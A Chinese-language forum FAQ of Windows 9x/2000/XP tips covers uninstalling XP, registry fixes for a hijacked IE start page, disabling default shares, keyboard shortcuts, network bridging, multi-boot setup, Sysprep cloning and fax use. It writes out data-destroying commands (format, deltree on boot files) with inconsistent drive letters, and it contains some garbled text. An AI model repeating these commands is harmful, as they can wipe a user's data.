首先我们用9x的启动软盘引导计算机进入ms-dos系统后，运行格式化圆盘分区的命令，直接快速格式化windowsxp所在的分区（如果这个盘中有重要的资料，请先备份！）
操作过程：
format D:/q
然后执行系统传输命令，将9x引导文件传输到c盘分区中：
sys c：
接着运行命令将进行删除与windows xp系统相关文件的命令：
deltree c:\boot*.*
deltree c:\nt*.*
deltree c:\hiberfil.sys
deltree c:\pagefile.sys
至此，我们就把一个windows xp“卸载”完了！ 

12：如何彻底删除输入法文件 
答：先到输入法设置中删除你要删除的输入法
使用搜索功能 搜索到输入法的对应文件删除！
　　全拼：Winpy.ime、Winpy.mb、Winpy.hlp、Winpy.cnt。 
　　双拼：Winsp.ime、Winsp.mb、Winsp.hlp、Winsp.cnt。 
　　微拼：Pintllime.dll、Pintlgab.imd、Pintlgai.imd、Pintlgb.imd、Pintlgd.imd、 Pintlgdx.imd、Pintlgie.imd、Pintlgnt.cnt、Pintlgnt.hlp、Pintlgnt.i96、 Pintlgnt.ime、Pintlgrb.imd、Pintlgri.imd、Pintlgs.imd、Pintlgsi.imd、Pintlgsx.imd、Pintlgu.imd、Pintlguc..imd、Pintlphr.exe。 
　　智能ABC：Winabc.cwd、Abcsda.dll、Abcwin.exe、Winabc.ime、Winabc.ovl、tmmr.rem、user.rem、Winabc.hlp、Winabc.cnt。 
　　郑码：Winzm.ime、Winzm.mb、Winzm.hlp、Winzm.cnt。 
　　内码输入法：Wingb.mb、Wingb.hlp、Wingb.cnt。 
　　表形码：Winbx.mb，Winbx.ime，Winbx.hlp，Winbx.cnt。 

13：如何減少Windows XP磁盤掃描的時間 
答：XP不正常関机，下次啓動的時候系統酒會進行磁盤掃描！可是都要等待10秒鐘的時間！那則樣來減少等待的時間呢？
主要运行“cmd”进入dos窗口，然后输入“chkntfs /t：0”回车就可以了！时间缩短到无了！ 

14:安装windows 98过程中出现“内存不足”怎么办 
答：第一种是实在是内存过少（比如少于32MB）这里就要升级内存了，这种现在也少遇见了，呵呵
第二种是软件设置上的问题。请在系统配置文件Config.sys中找到所有涉及到驻留程序TSR的命令行，在这些命令行前加上*字符使之成为注释语句，并把设备驱动程序加载到高端内存区。这些操作可以增加MS-DOS程序常规内存。然后，重新运行Windows 98的安装程序即可。 

15：我的IE被黑了怎么办啊 
答：我们可以通过修改注册表来恢复！
请按下列步骤做
先“开始”--“运行” regedit回车
然后根据你的需要修改注册表
1：保护IE默认页面
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main在右边窗口找到Default_Page_URL，将网址删除掉就可以了！
2：保护ie起始页面
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main在右边窗口找到Start Page，将自己的网页替换原来的网页！
3：保护ie标题栏
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main在右边窗口找到Window title，将这项的内容删除（或换上自己的文字，本人就换成了“我的IE你别动”）即可。若要恢复IE默认标题栏，只需要将该字符串值删除即可！
4：去处强制运行的网页
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run在右边的窗口中把包含右网址的字符串删除掉。
最后还请大家下载，金山的注册表保护器来保护好注册表。（在本人的签名中有它的下载页面） 
16:如何格盘重装XP望指教～(XP盘是ntfs的) 
答：我先要知道你`安装有xp的机器的`那个硬盘格式是fat32的还是ntfs的 
如果是ntfs的要先转化为fat32先！
如果是就用pq（硬盘魔术师）先请转化为fat32 （注意備份重要數據,還由，被壓縮過的分區轉化不了的！） 
去弄张98的启动盘 
设定bios从软盘引导计算机 
插入98启动软盘（windows目录下找到smartdrv.exe也放到这张软盘中），把xp的光盘放入光驱。启动电脑 
然后出现要你选择是选择1回车 
然后format c：/q回车 
然后运行smartdrv 4096回车 
然后x：/i386/winnt.exe回车！（x是你的光驱） 
17:2000的默认共享如何清除 
答：使用REGEDIT打开到以下位置： 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters 
PROFESSIONAL版 
在右边建立一个名为AutoShareWks的DWORD键。值为0 
SERVER版 
在右边建立一个名为AutoShareServer的DWORD键。值为0 
XP的方法同PROFESSIONAL 
18:我的网络防火墙报告拦截XXX地址上的XXX数据包 
答：既然防火墙已经报告拦截基本就没有什么危险。没有必要就因为简单的扫描或攻击就心惊胆战的。有上网就有基本的扫描。这很正常。
19：如何上传图片&使用個性頭像 
答：請看這裡 

20:如何解决鼠标失灵问题 
答：当前的鼠标市场已由光电鼠标转为以机械鼠标为主导。虽然机械鼠标有较大的优点，但许多用户却经常受到鼠标失灵的困扰，日常过程中有3个原因可能引起鼠标失灵。 
（1）时间久了，内部滚轮因积灰尘太多而滚动失灵。 
（2）由于发光管或光敏三极管的敏感度下降等原因，造成感光不敏感。 
（3）按键弹簧失灵。 
鉴于以上3种情况，维修的方法是： 
（1）打开鼠标下部的滚珠盖，取出滚珠，用镊子等钝器轻轻刮除滚轮上的灰尘。 
（2）用螺丝刀打开鼠标盒子，可见如图1所示的两组器件，一组专门负责管理横坐标，另一组负责管理纵坐标。用药棉等柔软物沾酒精擦洗齿轮两边的发光管和光敏三极管，并适当调整两管之间的距离，以增强感光敏感度。 
（3）用新的按键替换失灵按键。 
不是上述原因的就是病毒或什么的!请先杀毒 








	四：OS详解（win9x/2k/xp）
XP技巧小总
1：Win XP 键盘快捷键概述 
在 Win XP 中工作和Windows中工作时一样，利用快捷键代替鼠标。可以利用键盘快捷键打开、关闭和导航“开始”菜单、桌面、菜单、对话框以及网页。键盘还可以让您更简单地与计算机交互。 
　　单击一个标题或按 TAB 键可以突出显示这个标题，然后按 ENTER 键。 
　　一、常规键盘快捷键 
按键 目的 
Ctrl + C 复制。 
Ctrl + X 剪切。 
Ctrl + V 粘贴。 
Ctrl + Z 撤消。 
DELETE 删除。 
Shift + Delete 永久删除所选项，而不将它放到“回收站”中。 
拖动某一项时按 CTRL 复制所选项。 
拖动某一项时按 CTRL + SHIFT 创建所选项目的快捷键。 
F2 重新命名所选项目。 
CTRL + 向右键 将插入点移动到下一个单词的起始处。 
CTRL + 向左键 将插入点移动到前一个单词的起始处。 
CTRL + 向下键 将插入点移动到下一段落的起始处。 
CTRL + 向上键 将插入点移动到前一段落的起始处。 
CTRL + SHIFT + 任何箭头键 突出显示一块文本。 
SHIFT + 任何箭头键 在窗口或桌面上选择多项，或者选中文档中的文本。 
Ctrl + A 选中全部内容。 
F3 搜索文件或文件夹。 
Alt + Enter 查看所选项目的属性。 
Alt + F4 关闭当前项目或者退出当前程序。 
ALT + Enter 显示所选对象的属性。 
Alt + 空格键 为当前窗口打开快捷菜单。 
Ctrl + F4 在允许同时打开多个文档的程序中关闭当前文档。 
Alt + Tab 在打开的项目之间切换。 
Alt + Esc 以项目打开的顺序循环切换。 
F6 在窗口或桌面上循环切换屏幕元素。 
F4 显示“我的电脑”和“Windows 资源管理器”中的“地址”栏列表。 
Shift + F10 显示所选项的快捷菜单。 
Alt + 空格键 显示当前窗口的“系统”菜单。 
Ctrl + Esc 显示“开始”菜单。 
ALT + 菜单名中带下划线的字母 显示相应的菜单。 
在打开的菜单上显示的命令名称中带有下划线的字母 执行相应的命令。 
F10 激活当前程序中的菜单条。 
右箭头键 打开右边的下一菜单或者打开子菜单。 
左箭头键 打开左边的下一菜单或者关闭子菜单。 
F5 刷新当前窗口。 
BackSpace 在“我的电脑”或“Windows 资源管理器”中查看上一层文件夹。 
Esc 取消当前任务。 
将光盘插入到 CD-ROM 驱动器时按 SHIFT 键 阻止光盘自动播放。 
　　二、对话框快捷键 
按键 目的 
Ctrl + Tab 在选项卡之间向前移动。 
Ctrl + Shift +Tab 在选项卡之间向后移动。 
Tab 在选项之间向前移动。 
Shift + Tab 在选项之间向后移动。 
ALT + 带下划线的字母 执行相应的命令或选中相应的选项。 
Enter 执行活选项动或按钮所对应的命令。 
空格键 如果活选项动是复选框，则选中或清除该复选框。 
箭头键 活选项动是一组选项按钮时，请选中某个按钮。 
F1 显示帮助。 
F4 显示当前列表中的项目。 
BackSpace 如果在“另存为”或“打开”对话框中选中了某个文件夹，则打开上一级文件夹。 
　　三、自然键盘快捷键 
　　在“Microsoft 自然键盘”或包含 Windows 徽标键(简称WIN) 和“应用程序”键(简称KEY) 的其他兼容键盘中，您可以使用以下快捷键。 
按键 目的 
WIN 显示或隐藏"开始"菜单。 
WIN+ BREAK 显示"系统属性"对话框。 
WIN+ D 显示桌面。 
WIN+ M 最小化所有窗口。 
WIN+ Shift + M 还原最小化的窗口。 
WIN+ E 打开"我的电脑"。 
WIN+ F 搜索文件或文件夹。 
CTRL+WIN+ F 搜索计算机。 
WIN+ F1 显示 Windows 帮助。 
WIN+ L 如果连接到网络域，则锁定您的计算机，或者如果没有连接到网络域，则切换用户。 
WIN+ R 打开"运行"对话框。 
KEY 显示所选项的快捷菜单。 
WIN+ U 打开"工具管理器"。 
　　四、辅助键盘快捷键 
按键 目的 
右侧 SHIFT 键八秒钟 切换“筛选键”的开和关。 
左边的 ALT + 左边的 SHIFT + PRINT SCREEN 切换“高对比度”的开和关。 
左边的 ALT + 左边的 SHIFT + NUM LOCK 切换“鼠标键”的开和关。 
Shift 键五次 切换“粘滞键”的开和关。 
Num Lock 键五秒钟 切换“切换键”的开和关。 
WIN+ U 打开“工具管理器”。 
　　“Windows 资源管理器”键盘快捷键 
按键 目的 
END 显示当前窗口的底端。 
主页 显示当前窗口的顶端。 
NUM LOCK + 数字键盘的星号 (*) 显示所选文件夹的所有子文件夹。 
NUM LOCK + 数字键盘的加号 (+) 显示所选文件夹的内容。 
NUM LOCK + 数字键盘的减号 (-) 折叠所选的文件夹。 
左箭头键 当前所选项处于展开状态时折叠该项，或选定其父文件夹。 
右箭头键 当前所选项处于折叠状态时展开该项，或选定第一 
2：Win XP中的网桥
　　网桥，这个名词听起来好像既熟悉又陌生，它到底是什么呢？其实网桥是一种连接局域网 (LAN) 段的廉价而便捷的方法。若要了解网桥如何工作，则需要首先了解 LAN 段。LAN 段是连接计算机的网络媒体的单个部分。例如，假设您有三台计算机：计算机 A、计算机 B 和计算机 C。计算机 A 有两个以太网卡，而计算机 B 和 C 各有一个以太网卡。连接 A 和 B 的以太网电缆将创建一个 LAN 段。另一个连接 A 和 C 的以太网电缆将创建另一个 LAN 段。 
　　传统上，如果您需要网络具有多个段，则您有两个选择：路由和桥接。IP 路由是连接网络段的常用解决方案。但是，若要安装 IP 路由，则需要购买硬件路由器或在段之间的交接处安装计算机以用作路由器。对于每个网络段上的每台计算机而言，IP 路由都要求对 IP 寻址进行复杂配置，而且每个网络段都需要配置为独立的子网。IP 路由是适合于大型网络的解决方案，此时可缩放性很重要，而且需要经验丰富的人员配置和维护网络。硬件桥接解决方案不一定像 IP 路由一样进行复杂配置，但是它需要购买额外的硬件桥。如果是家庭或小型办公网络，则这两个选择都不理想，您既不愿意购买昂贵的搭桥硬件，也不愿意请有经验的人员管理 IP 路由网络。 
　　相反，网桥允许通过选择适当的网络连接图标并单击"桥接"，连接 LAN 段。相似的按钮允许您启用桥并将连接添加到该桥。网桥管理整个网络的 LAN 段并创建单个子网。不需要进行配置，不需要购买额外的硬件（如路由器或桥）。在单个子网 IP 网络中，IP 寻址、地址分配和名称解析将被高度简化。 
　　网桥可以在不同类型的网络媒体之间创建连接。在传统网络中，如果使用混合媒体类型，则每种媒体都需要一个单独子网，而且需要在多个网络子网间进行数据包转发。因为不同的媒体类型要使用不同的协议，所以需要进行数据包转发。"网桥"自动进行所需的配置，以将信息从一种媒体类型转发到另一种类型。 
　　Windows XP 计算机上只能存在一个桥，但可以使用它来桥接所有计算机实际允许的网络连接。 
"网桥"使用 IEEE 跨越树算法 (STA) 建立无循环转发拓扑。当已搭桥网络中存在多条路径时，循环可以形成，而且桥的简单转发规则将导致转发风暴，即同一帧将从一条桥到另一条桥进行无止境的中继。STA 提供自动机制以便在必要时选择性地禁用单个端口上的桥转发，以确保转发拓扑是非循环的。对于跨越树算法而言，不必配置网桥。 
　　说了那么多，那么到底普通用户如何安装并设置和使用网桥呢，下面请听我详细道来： 
　　一、创建网桥： 
　　1．打开"网络连接"（ 要打开"网络连接"，请单击"开始"，指向"设置"，然后双击"控制面板"，单击"网络和 Internet 连接"，然后单击"网络连接"）。 
　　2．在"LAN 或高速 Internet"下，选择要将其作为桥的各个部分的每个专用网络连接。 
　　3．右键单击突出显示的专用网络连接之一，然后单击"桥接"。 
　　二、将连接添加到网桥 
　　1．打开" 网络连接"。 
　　2．在"网桥"下，右键单击"网桥"，然后单击"属性"。 
　　3.在"常规"选项卡的"适配器"下，选择要添加到桥的每个适配器的复选框，然后单击"确定"。 
　　三、启用或禁用网桥 
　　1．打开 网络连接。 
　　2．在"网桥"下，右键单击"网桥"，然后选择下面的一项操作： 
　　3．若要启用"网桥"，请单击"启用"。 
　　4．若要禁用"网桥"，请单击"禁用"。 
四、从网桥删除连接 
　　1．打开 网络连接。 
　　2．在"网桥"下，右键单击"网桥"，然后单击"属性"。 
　　3．在"常规"选项卡的"适配器"下，选择要删除的适配器旁边的复选框，然后单击"确定"。 
　　但是，在这里要注意以下几个方面：必须以管理员或 Administrators 组成员身份登录才能完成该过程。如果计算机与网络连接，则网络策略设置也可以阻止您完成此步骤；必须至少选择两个合格的网络连接才能使用"桥接"创建桥；已启用 Internet 连接共享 (ICS) 或 Internet 连接防火墙 (ICF) 的适配器不能成为网桥的一部分，也不会出现在网桥清单中。同样，"添加到桥"菜单命令只适用于可作为连接添加到网桥的适配器；只有以太网、IEEE-1394 适配器或者诸如无线这样的以太网兼容适配器，以及家庭电话线适配器 (HPNA) 才可以成为网桥的一部分；如果没有启用 ICF 或 Internet 连接共享 (ICS)，请不要在公用 Internet 连接和专用网络连接之间创建桥，或者将公用 Internet 连接添加到现有网桥。这样做将在您的网络和 Internet 之间创建不受保护的链接，因此您的网络容易受到攻击；一台计算机上只能创建一个网桥，不过该桥可以容纳无数网络连接；无法在运行 Windows 2000 或更早版本 Windows 的计算机上创建桥接；如果从网桥删除了适配器，而且保留的适配器不足两个，则网桥不会执行预期的功能，不过将继续使用系统资源；当以前显示在"LAN 或高速 Internet"下的网络适配器添加为连接时，它将出现在"网桥"下。提供 Internet 连接的网络适配器（如 DSL 和电缆调制解调器）不能被桥接，而且将始终出现在"LAN 或高速 Internet"下；在启用网桥前，必须使用"桥接"创建网桥；如果禁用网桥，则网络上的计算机将无法与其他网络段上的计算机通讯。网络上的某些计算机还可能中断 Internet 连接；如果从网桥删除了适配器，而且保留的适配器不足两个，则网桥不会执行预期的功能，不过将继续使用系统资源；至少必须有两个适配器连接到桥才能保证其功能；如果打开了"网络连接"文件夹，也可以从网桥删除网络连接，在"网桥"下，右键单击要删除的适配器，然后单击"从网桥删除"；如果从网桥删除适配器，而且保留的适配器不足两个，则网桥不会执行预期的功能，不过将继续使用系统资源。使用无线或 IEEE-1394 连接的网桥只支持使用网际协议版本 4 (IPv4) 的通信；Internet 连接共享、Internet 连接防火墙、发现和控制，以及网桥在 Windows XP 64-Bit Edition 中都是可用的。 
那么网桥到底能够达到何种效果和有何应用价值呢？其实通过网桥可以进行网桥的组策略，其大意就是"网桥"使计算机管理员可跨两个或多个网络连接创建桥，使网络通信可通过桥中包括的所有网络连接，就好像所有这些连接都是同一网络子网的一部分。"组策略"设置将定义系统管理员需要管理的用户桌面环境的各种组件。禁止在您的 DNS 域网络上安装和配置，使用网桥确定具有管理权限的计算机用户是否可在 DNS 域网络上启用"网桥"。 
　　只有存在两个或多个网络适配器时，"网桥"菜单命令"桥接"才是可用的。默认情况下，"网桥"被禁用，但是管理员可以使用网络连接图标上的菜单启用它。如果启?quot;禁止在您的 DNS 域网络上安装，配置，使用网桥"设置以禁止在域网络上使用"网桥"，则因为"桥接"命令已从网络连接图标的菜单上删除，所以无法创建"网桥"。禁止权限有限的计算机用户配置"网桥"，而不管该设置是什么。 
　　如果在启用该策略前网络上的计算机中已经存在"网桥"，则因为该设置知道位置，所以此桥将继续存在。只有当计算机连接到该设置最后一次刷新时所连接到的同一 DNS 域网络时，才应用该设置。如果计算机（如笔记本电脑）连接到您的 DNS 域网络，但是计算机上的这一设置最后一次刷新是在其他网络上进行的，则您网络上的此设置不会应用到该计算机。 
3：Win98+Win2000+WinXP三操作系统共同使用安装实录
£燱inXP已经正式发布了，大家都很想知道WinXP能不能够实现多操作系统引导，答案是肯定的，我已经试验成功了，现在我把我的安装过程告诉大家： 
1.首先安装Win98，并且安装常用的软件。这一步我想大家均很熟悉了，这里就不详细介绍了。 
2.再安装Win2000，这一步的安装很讲究。 
2.1 把Win2000光盘里面的i386文件夹复制到硬盘上，然后在DOS下安装。 
2.2 现加载smartdrv.exe，然后到i386目录下执行winnt，系统会自动提示。注意!!必须把Win2000安装到另外一个分区并且选择全新安装! 
3.安装WinXP 
本人使用的是正式版本的WinXP简体中文版，特别注意：安装时必须停止运行Norton Antivirus，否则不能够安装成功。安装启动以后（提示选择全新安装还是升级安装，一定要选择全新安装(如图)，然后系统会要求输入序列号，接着又一个对话框。注意：一定要选择高级选项中的“我想再安装 过程中选择安装驱动器号和磁盘分区”，如果不选中就不能够安装三操作系统。接着的安装过程中会提示选择安装的磁盘分区，选择一个可以用的空分区就可以了。最后重新启动，重新启动以后就能看到启动菜单了。 
顺便说一下：没有激活的WinXP只能够使用30天，30天以后系统会自动锁定等待激活，现在网络上有很多破解方法，但是有效的基本上没有。WinXP不同于OfficeXP，它是一个操作系统而不是一个应用软件。强行激活以后系统会出现不稳定的情况。 
4：Windows XP安装问题解答精选 
　　不管你是喜欢还是厌恶，微软的最新一代操作系统Windows XP如期伴随比尔.盖茨那大男孩般的笑容发布了。到底是好是坏还是让时间去见证，但面对XP的诱惑，相信越来越多的朋友都想尝一下鲜。由于Windows XP对硬件、软件的运行环境比以前的操作系统要求更严格，所以很多朋友在安装时总会遇到各种问题。下面我就向大家介绍一下安装Windows XP时常遇到的问题及解决方法，希望对你有所帮助。 
　　Windows XP的Home及Professional版本, 我该选择哪个? 
　　Windows XP Home：属于家用型操作系统，支持数字摄影、音乐、计算机游戏以及网际网络的功能，提供家庭使用者简单易用的环境。 
　　Windows XP Professional：属于商用型操作系统，加强与Windows 服务器整合的能力，提供的更严密的安全性。 
　　注：Windows XP Professional版本，包含所有Windows XP Home所有的功能。下表为Home与Professional两版本主要功能差异一览表： 
功能 Windows XP Professional Windows XP Home 
远程端桌面控制 Yes No 
离线档案与文件夹 Yes No 
多处理器支持 2 1 
加密档案系统 Yes No 
权限帐号 Yes No 
计算机网域帐号支持 Yes No 
群组原则 Yes No 
远程安装服务 Yes No 
MUI多国语言接口 Yes No 
IIS服务 Yes No 
IPSec加密功能 Yes No 
NetWare客户端服务 Yes No 
使用拨号网络登入网络服务 Yes No 
漫游使用者 Yes No 
　　目前现有的Windows版本中，哪些能够直接升级到Windows XP？ 
Upgrade From Windows XP Home Windows XP Professional 
Win3.x, Win95 No No 
Windows 98 Yes Yes 
Windows ME Yes Yes 
Windows NT 3.x Workstation No No 
Windows NT 4.0 Workstation Up to SP4 No No 
Windows NT 4.0 Workstation SP5 or Higher No Yes 
Windows 2000 Professional No Yes 
Windows Server Products No No 
Windows XP Home Edition Yes Yes 
Windows XP Professional No Yes 
　　请参照下表： 
　　如何把已经升级到Windows XP的系统，恢复到原来的操作环境？ 
　　(1)如果你是从Windows98/98SE/ME直接升级到Windows XP操作系统的：可以运行\"[控制面板]/[ 添加/删除程序]/[卸载Windows XP ]\"，就可以恢复到先前Windows版本。 
　　注意：如果升级后，你曾运行过以下其中任一项操作，则无法恢复到先前系统。 
　　A、将磁盘分区格式转换为NTFS； 
　　B、运行[磁盘清理]工具； 
　　(2)如果你是由WinNT/2000操作系统升级到Windows XP：由于它们的内核相同，这是单向的步骤。也就是说，当你的系统已经升级到Windows XP之后就无法恢复到原来的操作系统，只有重新安装了，所以在升级请考虑清楚是否要直接升级。 
　　建议：如果你还拿不定主意是否最终选择Windows XP，那么你最好把原来的系统备份起来或使用多重启动，将Windows XP安装在不同分区或硬盘上。这样可以防止由于软、硬件的兼容性导致升级失败，而造成数据资料的丢失。 
　　安装Windows XP前须注意什么？ 
　　(1)不论你使用的是台式PC或笔记本电脑，请先与你的PC厂商确定是否有其安装或升级应注意事项，或安装后的搭配问题，有些厂商会利用此机会推出新的BIOS来支持Windows XP新的功能规格。 
　　(2)事先确认外设是否有更新的驱动程序或搭配Windows XP应注意事项：厂商会告诉你Windows XP是否有含此外围设备的驱动程序？自动侦测时是否会有问题？厂商是否有更新驱动程序的计划？原来Windows的驱动程序可否在Windows XP继续使用等信息。你可以通过以下方法来检测：放入Windows XP安装光盘，在根目录下运行setup.exe，选择\"[检查系统兼容性]/[自动检查我的系统]\"。系统会自动检查你的硬件及软件，并报告所有潜在的冲突。此外你可以www.microsoft.com/hcl/来确认你的外围配备是否在Windows XP硬件兼容性测试规格内。 
　　(3)建议你不要超频你的CPU。 
　　(4)关闭BIOS之病毒侦测功能以及电源管理系统。关闭病毒侦测方法：在BIOS FEATURES SETUP里的Virus Warning 设定成Disabled。 
　　(5)关闭电源管理系统：请在 POWER MANAGEMENT SETUP 里的Power Management 设定成Disables。 
　　(6)如有装设KeyPro(保护卡)也请卸下，等安装完毕后再装回。 
　　(7)在运行安装程序之前最好进行病毒扫瞄。 
　　(8)在运行安装程序之前先运行 ScanDisk 或 Chkdsk，检查有无坏扇区或坏轨。 
　　(9)如果你有任何有关于硬件或软件的问题，请在安装 Windows XP中文版之前先行修复。 
　　(10)备份Autoexec.bat及Config.sys到软盘上 。 
　　(11)删除 Config.sys 及 Autoexec.bat 文件中所有不必要的程序。这些程序包括 Undelete 程序、防毒软件、启动组态程序或任何磁盘公用程序等。 
　　(12)将BIOS设成Load setup default或Load BIOS default。 
　　(13)删除安装时不需要的硬件装置 (如：声卡、MPEG卡，或其它特殊之适配卡) 
　　如何使Windows 9x/NT/2000/XP共同安装在同一台电脑上？ 
　　若要让Windows 9x, Windows NT, Windows 2000及Windows XP同时可以在一台机器上安装，必须先考虑档案格式必须为FAT16、FAT32或NTFS的档案格式。 
　　(1)Windows 98或Windows Millennium与Windows XP并存： 
　　a.启动磁盘的档案格式必须为FAT16或FAT32，不可为NTFS；原因是Win98/Me不支持NTFS的档案格式。 
　　b.安装顺序为先装Win98/Me，再直接从Win98/Me操作系统下运行WinXP的安装程序，则自动会形成双重启动的启动画面。 
　　(2)Windows NT 4.0或Windows 2000与Windows XP并存： 
　　a.启动磁盘的档案格式必须为FAT16或NTFS，不可为FAT32；原因是Windows NT不支持FAT32的档案格式。(注：Windows 2000 可以为FAT32)。 

b.安装顺序为先装Windows NT 4.0或Windows 2000，再直接从Windows NT 4.0或Windows 2000操作系统下运行Windows XP的安装程序，则自动会形成双重启动启动画面。(请注意Windows NT必需先升级到Service Pack 5以上的版本)。 
　　(3)Windows 98或Windows Millennium, Windows NT 4.0或Windows 2000及Windows XP同时存在： 
　　a.启动磁盘的档案格式必须为FAT16，不得为FAT32及NTFS；因为Windows 98 或Windows Millennium不支持NTFS，而Windows NT不支持FAT32。 
　　b.安装顺序为先装Windows 98或Windows Millennium，再直接从Windows 98或Windows Millennium 操作系统下运行Windows NT 4.0或Windows 2000安装程式，(注：Windows NT后请升级至SP5以上的版本)，然再到Windows NT 4.0或Windows 2000的操作系统下运行Windows XP的安装程序，则自动会形成三重启动的启动画面。 
　　如何设定使用Windows XP传真功能？ 
　　(1)打开[控制面板] 中的 [添加/删除程序]。 
　　(2)按一下[添加/删除 Windows 组件]，在 [Windows 组件] 中，选取 [传真服务] 复选框，并遵循屏幕上的指示进行。 
　　(3)启动[传真] 组件：请按 [开始]，依序指向 [所有程序]、[附件] 及 [通讯]，再按 [传真控制台]即可。 
　　如果硬件或BIOS与Windows XP的ACPI规格不符时，在安装时会有什么问题？ 
　　如果安装Windows XP时，第一次重新启动计算机后，画面就停留在Windows XP启动画面，无法完成安装程序。建议你与主机板厂商联系，更新你的BIOS。若你无法立即更新BIOS，你可以进入Bios选单，查看Bios Power Management Setup 中 Disable \"ACPI function\"。并重新运行windows XP安装时按F5，在出现的选项中，选择Standard PC，以便完成windows XP安装。但完成安装后将无法使用ACPI各项功能。 
　　如何利用Ghost方式来快速安装Windows XP到多台硬件设备相同的计算机？ 
　　如果你单位有多台相同硬件设备的计算机，你想利用\"Symantec Ghost\"这类产品所做的映像档(image file)来快速安装Windows XP在这些计算机时，你可使用\"SYSPREP\" TOOL修改本机计算机的 [安全性识别码 (SID)]，让它成为每台计算机的专用识别码。 
　　A、运行步骤： 
　　(1)请先利用WINZIP，解压缩SysPrep tool(在Windows XP安装光盘，路径 support oolsdeploy.cab)。 
　　(2)准备复制主要安装：先在某一台主计算机上安装 Windows XP Professional，你可选择安装及自定Microsoft Office、Internet Explorer 收藏夹项目等应用程序 。 
　　(3)运行Sysprep.exe。注意：请先确定Sysprep.exe及Setupcl.exe 档案都在本机硬盘的 %systemdrive%Sysprep 文件夹中，或是在Windows 启动菜单出现时插入的磁盘中。如果 Setupcl.exe 和 Sysprep.exe 不在同一个目录，Sysprep 无法运作。 
　　(4)在旗标里选择 [MiniSetup] 与 [PNP] ，然后选择〔重新安装〕，在关机项目里，可自行选择重新启动计算机或直接关机 。 
　　(5)如果计算机符合 ACPI，它会自行关机。否则会出现对话框指出你现在可以安全的关闭计算机。 
　　(6)关机后，你就可以运行GHOST程序，将运行过SysPrep的Windows XP，制作成映像档(image file)。 
　　B、当用Ghost方式复制安装Windows XP的硬盘安装到计算机后，使用者开启计算机时，会出现下列对情况： 
　　(1)随插即用开始侦测 - 约需 3 分钟； 
　　(2)请你指定使用者的名称及组织； 
　　(3)请你加入网域或工作群组； 
　　(4)请你指定地区选项信息； 
　　(5)请你指定 TAPI 信息； 
　　(6)请你指定要安装的网络通讯协议及服务； 
　　(7)请你删除 %systemdrive% 中有 Sysprep.exe 及 Sysprep.inf 的本机 Sysprep 文件夹。 
　　C、注意事项： 
　　(1)先在测试的机器测试过，再依照实际的环境做必要的调配 。 
　　(2)若要将 SysPrep 使用成磁盘复制程序的一部份，则必须遵守下列规定： 
　　a、主要安装及目的地计算机的硬件抽象层 (HAL) 必须兼容。例如：HAL APIC 及 HAL MP (多处理器系统) 是兼容的，而 HAL PIC (Programmable Interrupt Controller) 与 HAL APIC 或 HAL MP是不兼容的。 
　　b、参照计算机与目的地计算机之间的大型存放装置控制器 (IDE 或 SCSI) 必须相同。调制解调器、声卡、网络卡、视讯卡等随插即用装置，不一定要相同。但是，运行 Sysprep 之前，Drivers.cab 中没有的装置驱动程序，应该放入主要安装中。或是让未安装的驱动程序在初次运行目的地计算机时都有效，以便让随插即用 可侦测到后，完成安装驱动程序的程序。 
　　c、目的地计算机的硬盘空间，至少必须与主要安装的硬盘大小相同。如果目的地计算机的硬盘较大，这项差异不会列入主要磁盘分区中。但如果它采用 NTFS 档案系统格式，你可以使用 Sysprep.inf 档案中的 ExtendOemPartition 项目来延伸主要磁盘分区。 
　　d、[如果参照计算机及目的地计算机的 BIOS 版本不同，你应该先测试处理程序确定能否成功。使用 Sysprep 运行磁盘重复时，Sysprep 会修改本机计算机的 [安全性识别码 (SID)]，让它成为每台计算机的专用识别码] 
　　如果无法以光盘启动的方式来安装Windows XP时，该怎么办？ 
　　对于这个问题你可以通过制作Windows XP启动磁盘启动后，再安装windows XP。请按照以下步骤来制作Windows XP启动磁盘：首先，请先准备六片空白的1.44MB软盘，然后从微软件网站下载相对版本的简体中文制作档案，下载完毕后，直接运行该档案，并依照指示将空白磁盘放入软盘机中即可。 
　　如何解决某些老式芯片(如S3)的显卡，在Windows XP平台上卷动屏幕画面时容易发生画面静止问题? 
　　发生这种情形时，请重新启动进入Windows XP后，依照下列方法处理：选择\"[开始]/[ 所有程序]/[控制面板]\"，然后双击[显示]图标，在出现面板中选择\"[设置]/[高级]/[疑难解答]\"，将\"硬件加速\"功能从最大设为无。注意: 为彻底解决此问题，你最好到相关网站下载或更新驱动程序以及BIOS。
5：Windows XP传真功能详解 
在宽带网迅速普及的今天，我们手上的Modem好像已经“廉颇老矣”，用它上网的话速度太慢了，在惨遭淘汰之后，陪伴我们无数个日日夜夜的小猫就没有任何价值了吗？当然不是，我们还可以通过你手上的Modem发送和接收传真，其效果是非常理想的，这样既可以使我们的Modem重新焕发青春，又可以为我们的电脑增加一项实际的功能。 
你用宽带了吗？速度很快吧！可是那样一来我们手上的Modem就没事儿干了，那么Modem是不是就变成了一块“食之无味，弃之可惜”的鸡肋了呢？别忘了Modem可是一个数字信号和模拟信号相互转换的设备呀，它和传真机的基本工作原理其实都是一样的，只不过传真机比Modem多了个“扫描仪”和“打印机”的功能罢了。那么我们能不能把Modem变成一台传真机呢？完全可以，像Windows XP就为我们提供了非常完善的传真功能，可以让我们的Modem摇身一变，成为一台网络传真机。 
设置传真机 
首先需要说明的是，如果你还在用Modem上网，那么就不需要设置什么了；如果你已经不用Modem上网，那么只需像以前拨号上网时那样重新添加一遍就可以了，这里就不再多说了。接下来让我们一起来看看如何设置传真。在Windows XP的默认安装方式中是没有传真机的，所以我们要先添加传真机，单击“开始”→“打印机和传真”，我们将会看到“打印机和传真”的对话框，如下图所示，单击“设置传真”。 
接下来Windows将为我们安装和配置传真机的组件。 
安装完毕后，我们可以在“打印机和传真”的对话框中看到一个名为“Fax”的图标。双击此图标，我们将看到“传真配置向导”，单击“下一步”，我们来设置一下传真号码、电子邮件、电话号码等发件人信息。 
填好后，单击“下一步”，我们就完成了对传真的配置，单击“完成”。此时Windows将弹出“传真控制台”对话框，此对话框与Outlook的界面非常相似，使用起来也大同小异。 
发送传真 
对传真机设置完成后，就可以准备发送传真了。首先单击“文件” →“发送传真”，我们将看到“传真发送向导”对话框。 
